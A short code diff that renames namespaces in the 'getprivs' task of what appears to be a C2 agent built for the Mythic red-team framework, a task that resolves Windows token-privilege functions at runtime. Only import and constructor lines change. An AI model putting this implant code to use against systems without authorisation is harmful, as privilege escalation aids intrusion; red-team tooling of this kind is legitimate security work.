@@ -6,10 +6,10 @@
 
 #if GETPRIVS
 
-using ApolloInterop.Classes;
-using ApolloInterop.Classes.Api;
-using ApolloInterop.Interfaces;
-using ApolloInterop.Structs.MythicStructs;
+using Interop.Classes;
+using Interop.Classes.Api;
+using Interop.Interfaces;
+using Interop.Structs.MythicStructs;
 using System;
 using System.Collections.Generic;
 using System.Runtime.InteropServices;
@@ -184,7 +184,7 @@ namespace Tasks
         private AdjustTokenPrivileges _pAdjustTokenPrivileges;
         
         #endregion
-        public getprivs(IAgent agent, ApolloInterop.Structs.MythicStructs.MythicTask data) : base(agent, data)
+        public getprivs(IAgent agent, Interop.Structs.MythicStructs.MythicTask data) : base(agent, data)
         {
             _pLookupPrivilegeValue = _agent.GetApi().GetLibraryFunction<LookupPrivilegeValue>(Library.ADVAPI32, "LookupPrivilegeValueA");
             _pAdjustTokenPrivileges = _agent.GetApi().GetLibraryFunction<AdjustTokenPrivileges>(Library.ADVAPI32, "AdjustTokenPrivileges");
